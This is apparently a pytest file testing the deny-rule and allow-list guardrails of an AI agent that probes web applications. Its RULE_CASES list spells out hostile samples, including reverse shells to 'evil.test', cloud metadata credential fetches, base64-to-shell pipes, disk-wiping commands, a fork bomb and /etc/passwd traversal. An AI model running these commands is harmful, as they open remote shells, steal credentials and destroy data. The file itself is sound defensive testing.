import pytest

from haris.agent.guardrails import DENY_RULES, screen

HOSTS = {"example.com"}

# Each sample is rejected by its own rule. The id set is the contract: deleting a
# rule fails this test even when another check would still block the string.
RULE_CASES = [
    ("command_subst", "$(id)"),
    ("backticks", "`id`"),
    ("dollar_brace", "${IFS}"),
    ("pipe_sh", "echo hi | sh"),
    ("pipe_bash", "echo hi | bash"),
    ("pipe_python", "echo hi | python"),
    ("base64_d_pipe", "echo aWQ= | base64 -d | sh"),
    ("base64_decode_flag", "base64 --decode blob"),
    ("b64decode_exec", "exec(base64.b64decode('aWQ='))"),
    ("fromhex_exec", "bytes.fromhex('6964'); exec('id')"),
    ("eval_call", "eval(payload)"),
    ("exec_call", "exec(payload)"),
    ("curl_pipe", "curl http://example.com/x | tee out"),
    ("dev_tcp", "exec 3<>/dev/tcp/evil.test/4444"),
    ("nc_e", "nc -e /bin/sh evil.test 4444"),
    ("ncat", "ncat -e /bin/bash evil.test 443"),
    ("socat", "socat TCP:evil.test:4444 EXEC:/bin/sh"),
    ("bash_i", "bash -i"),
    ("metadata_aws", "curl http://169.254.169.254/latest/meta-data"),
    ("metadata_gcp", "curl http://metadata.google.internal/"),
    ("metadata_alicloud", "curl http://100.100.100.200/"),
    ("metadata_ipv6", "curl http://[fd00:ec2::254]/"),
    ("pip_install", "pip install requests"),
    ("apt_install", "apt-get install -y netcat"),
    ("npm_install", "npm install -g evil"),
    ("rm_rf", "rm -rf /"),
    ("mkfs", "mkfs.ext4 /dev/sda"),
    ("dd_of", "dd if=/dev/zero of=/dev/sda"),
    ("shutdown", "shutdown -h now"),
    ("fork_bomb", ":(){ :|:& };:"),
    ("dotdot", "/work/../../etc/passwd"),
    ("docker_sock", "curl --unix-socket /var/run/docker.sock http://localhost"),
]

ALLOWED = [
    {
        "tool": "http_request",
        "arguments": {"method": "GET", "url": "http://example.com/search?q=1"},
    },
    {
        "tool": "http_request",
        "arguments": {"method": "HEAD", "url": "http://example.com/"},
    },
    {
        "tool": "http_request",
        "arguments": {"method": "OPTIONS", "url": "http://example.com/"},
    },
    {"tool": "read_file", "arguments": {"path": "/work/notes.txt"}},
    {"tool": "read_file", "arguments": {"path": "/work/a.txt"}},
    {
        "tool": "write_file",
        "arguments": {"path": "/work/poc.py", "content": "print(1)\n"},
    },
    {
        "tool": "write_file",
        "arguments": {"path": "/work/b.txt", "content": "value = 1\n"},
    },
    {"tool": "run_python", "arguments": {"script": "print(1)\n"}},
    {"tool": "run_python", "arguments": {"script": "value = 1 + 2\n"}},
    {
        "tool": "submit_poc",
        "arguments": {
            "url": "http://example.com/search?q={marker}",
            "oracle": "reflection",
        },
    },
    {
        "tool": "http_request",
        "arguments": {
            "method": "GET",
            "url": "http://example.com/search?q=1",
            "command": "curl -s http://example.com/search?q=1",
        },
    },
]


def test_denylist_entries_are_the_contract():
    """Removing a denylist id or its example must fail."""
    assert {rule_id for rule_id, _sample in RULE_CASES} == {
        rule.id for rule in DENY_RULES
    }
    assert len(RULE_CASES) >= 25
    by_id = {rule.id: rule for rule in DENY_RULES}
    for rule_id, sample in RULE_CASES:
        assert by_id[rule_id].pattern.search(sample), rule_id
        hit = screen(
            "run_python", {"script": "print(1)\n", "note": sample}, allowed_hosts=HOSTS
        )
        assert hit is not None, rule_id
        assert hit.rule == rule_id


def test_allow_list_accepts_benign_verbs():
    assert len(ALLOWED) >= 10
    for call in ALLOWED:
        hit = screen(str(call["tool"]), dict(call["arguments"]), allowed_hosts=HOSTS)
        assert hit is None, call


def test_unknown_verb_is_rejected_without_a_denylist_match():
    """A benign argument still dies when the tool is not on the allow-list."""
    hit = screen("shell", {"note": "echo hello"}, allowed_hosts=HOSTS)
    assert hit is not None
    assert hit.reason == "tool"


@pytest.mark.parametrize(
    "script",
    [
        "import subprocess\n",
        "import socket\n",
        "import os\nos.system('id')\n",
        "__import__('socket')\n",
    ],
)
def test_python_ast_blocks_execution_helpers(script: str):
    hit = screen("run_python", {"script": script}, allowed_hosts=HOSTS)
    assert hit is not None
    assert hit.reason == "python"


def test_write_outside_work_is_rejected():
    hit = screen(
        "write_file", {"path": "/etc/passwd", "content": "x"}, allowed_hosts=HOSTS
    )
    assert hit is not None
    assert hit.reason == "path"
